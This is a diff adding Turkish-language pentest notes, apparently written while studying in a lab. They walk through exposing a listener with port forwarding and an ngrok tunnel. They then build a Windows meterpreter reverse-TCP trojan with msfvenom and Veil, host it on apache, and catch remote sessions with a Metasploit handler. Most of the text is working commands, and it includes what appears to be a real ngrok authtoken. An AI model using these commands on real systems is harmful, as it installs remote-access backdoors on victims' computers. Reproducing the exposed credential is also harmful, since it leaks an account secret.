@@ -1,0 +1,86 @@
+	OUTSIDE NETWORK
+  PORT FORWARDING / Listening
+ set LHOST <public ip>	-> Hedef bilgisayarda çalıştırıldığı anda bu bağlantı modeme gider,
+ modeme gelen bu bilgi hangi porttan gelirse gelsin bana ilet Yani kali linux'a yönlendir diyebiliyoruz. 
+ set LPORT 4040
+
+
+
+
+
+  TUNNELING
+ Tünel servisleri, kendi makinemizde çalıştırdığımız apache gibi sunucuları internete açmamıza olanak tanır.
+ Port Forwarding'in Modem yerine herhangi bir Tünel Servisi kullanır. bkz: ngrok.com -> Download for Linux
+ Programın çalışması için tokenimizi kaydediyoruz:
+cd Downloads/ -> ./ngrok authtoken 23x2qIQq6YxnesbLV4H6lpYOI4F_61zjnzWqPjDqKvN1bg6go
+
+cd Downloads/
+./ngrok tcp 4242	-> Çok kullanılmayan bir port kullan mesela 80 portu web service portudur.
+ Forwarding kısmındaki tcp://6.tcp.ngrok.io:16370 'dan gelen verileri localhost:4242 yönlendirir, yani bizim için sanal bir port açar.
+
+
+
+
+
+  MSFVENOM ile Backdoor oluşturma
+ Kodları ile oynamadan Veil'i tünel servislerinde kullanamazsınız.
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=16370 -f exe -o /var/www/html/backdoors/msfVBackdoor.exe
+	lhost= kısmına "ngrok'un verdiği public bir ip vermemiz gerekiyor."
+	lport= kısmına "ngrok -> Forwarding -> tcp://6.tcp.ngrok.io:16370 -> girmemiz gereken değer: 16370 (backdoor oluştururken soldaki dış sunucu bilgilerini (public ip), Metasploit'a yazarken yani dinlerken ise sağdaki localhost(local ip) kısmını giriyoruz.
+	-> Trojanımız oluşturuldu!
+
+msfconsole
+use exploit/multi/handler
+use 4
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options
+set LHOST 0.0.0.0
+set LPORT 4242
+exploit -j -z
+
+ newtab -> service apache2 start
+ Sanal Windowsumuz tarayıcımızda 10.0.2.10/backdoors diye aratarak trojanımızı indirip çalıştırdığımızda,
+ Terminaldeki session'ımız uyanacaktır.
+
+enter
+sessions -l	-> Id yazan kısımdaki sayıyı kullanıyoruz:
+sessions -2	-> Bu session'ın içine girecektir. İşe yaramaz ise -> sessions -1
+	Şuanda Windows'u Hackledik!	
+-> dir yazarak içerisinde bulunduğumuz klasör hakkında bilgiler verilecektir.
+
+
+
+
+	VEIL ile Backdoor oluşturma
+	Veil'ı çalıştıramadık boşver zaten msfvenomla da yapabiliyoz boş yapma.
+cd Downloads/
+./ngrok tcp 4242
+
+
+cd ..
+cd opt/
+cd Veil/
+python3 Veil.py
+use 1
+list	-> Herhangi biri ile işlem yapabiliriz.
+use 7
+set lhost 0.tcp.ngrok.io
+ [!] ERROR: You did not provide a valid IP!   -> Hata aldığımız için Veil'ın kodlarını değiştireceğiz.
+set lport 16370		lport= kısmına "ngrok -> Forwarding -> tcp://6.tcp.ngrok.io:16370 -> girmemiz gereken değer: 16370 (backdoor oluştururken soldaki dış sunucu bilgilerini, dinlerken ise sağdaki localhost kısmını giriyoruz.
+generate	-> Yazdıktan sonra isim girdiğimizde Trojanımızı bizim için oluşturacaktır.
+
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost 0.0.0.0
+set lport 4242
+exploit -j -z	-> Dinlemeye başladık.
+
+
+ Cihaz http://10.0.2.10/backdoors/ içerisindeki Trojanımızı indirip çalıştırırsa session'ımız uyanacaktır.
+
+
+sessions -l
+sessions -1
+sysinfo		-> Çalıştırdığımızda Windowsu Hacklediğimizi görmüş olacağız.
